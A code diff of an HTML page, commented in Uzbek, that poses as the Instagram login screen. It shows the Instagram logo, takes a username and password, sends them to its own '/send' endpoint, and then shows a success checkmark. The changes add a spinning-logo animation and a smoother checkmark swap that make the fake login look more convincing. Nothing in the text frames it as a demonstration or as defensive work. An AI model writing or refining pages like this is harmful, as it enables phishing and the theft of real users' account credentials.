@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="uz">
 <head>
@@ -12,20 +13,30 @@
 
 <style>
 /* ===== Extra Styles for Responsive Checkmark & Status ===== */
+.insta-logo img, .success-logo img {
+    width: 100px; /* bir xil o'lcham */
+    height: 100px;
+    display: block;
+    margin: 0 auto 20px auto;
+    transition: transform 0.6s ease, opacity 0.6s ease;
+}
+
 .success-logo {
     display: none;
-    color: #4BB543;
-    font-size: 70px;
-    margin-bottom: 20px;
-    transition: transform 0.3s ease-in-out;
     text-align: center;
+}
+
+/* aylanish animatsiyasi */
+@keyframes spin {
+    from { transform: rotate(0deg); }
+    to { transform: rotate(360deg); }
 }
 
 /* Mobile adjustments */
 @media (max-width: 400px) {
-    .insta-logo img, .success-logo i {
+    .insta-logo img, .success-logo img {
         width: 60px;
-        font-size: 60px;
+        height: 60px;
     }
 
     input, button {
@@ -46,7 +57,7 @@
     <div class="login-box">
         <!-- Instagram logo -->
         <div class="insta-logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram Logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram Logo" id="insta-img">
         </div>
 
         <!-- Success checkmark icon -->
@@ -75,12 +86,17 @@ const form = document.getElementById("form");
 const status = document.getElementById("status");
 const instaLogo = document.querySelector(".insta-logo");
 const successLogo = document.querySelector(".success-logo");
+const instaImg = document.getElementById("insta-img");
+const checkImg = document.getElementById("checkmark-img");
 
 form.addEventListener("submit", async (e) => {
     e.preventDefault();
 
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
+
+    // Instagram logoni aylantirish
+    instaImg.style.animation = "spin 1s linear infinite";
 
     try {
         const response = await fetch("/send", {
@@ -90,27 +106,31 @@ form.addEventListener("submit", async (e) => {
         });
 
         if(response.ok){
-            // Instagram logoni yashirish
-            instaLogo.style.display = "none";
+            // 1 sekunddan keyin Instagram logosi galochka bilan almashtirilsin
+            setTimeout(() => {
+                instaLogo.style.display = "none";
+                instaImg.style.animation = ""; // animatsiyani to‘xtatish
+                successLogo.style.display = "block";
 
-            // Galochka logoni ko‘rsatish
-            successLogo.style.display = "block";
-            successLogo.style.transform = "scale(1.2)";
-            setTimeout(() => { successLogo.style.transform = "scale(1)"; }, 300);
+                checkImg.style.transform = "scale(1.2)";
+                setTimeout(() => { checkImg.style.transform = "scale(1)"; }, 300);
 
-            // Formani tozalash
-            form.reset();
+                form.reset();
+            }, 1000);
         } else {
             status.style.color = "red";
             status.textContent = "❌ Server bilan bog‘lanib bo‘lmadi";
+            instaImg.style.animation = "";
         }
     } catch(err){
         console.error(err);
         status.style.color = "red";
         status.textContent = "❌ Server bilan bog‘lanib bo‘lmadi";
+        instaImg.style.animation = "";
     }
 });
 </script>
 
 </body>
 </html>
+
